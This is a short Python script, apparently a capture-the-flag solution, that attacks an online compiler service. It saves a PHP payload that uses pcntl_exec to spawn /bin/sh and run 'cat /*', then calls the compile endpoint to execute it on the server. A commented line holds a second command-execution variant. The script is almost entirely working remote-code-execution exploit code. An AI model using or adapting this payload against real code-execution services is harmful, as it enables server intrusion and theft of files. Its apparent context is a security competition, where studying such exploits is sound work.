#!/usr/bin/env python3

import requests

HOST = "onlinecompiler.2021.3k.ctf.to:5000"
# HOST = "localhost:5000"

outname = 'l3opy'

# pcntl_exec("/usr/bin/python3",array('-c', 'import os; os.system("id");'));

def write_payload():
    r = requests.post(f"http://{HOST}/save", data={
        "c_type": "php",
        "code": f"""<?php pcntl_exec("/bin/sh",array("-c","cat /*"));?>"""
    })

    fname = r.text
    print(fname)

    r = requests.post(f"http://{HOST}/compile", data={
        "c_type": "php",
        "filename": fname
    })

    print(r.text)

write_payload()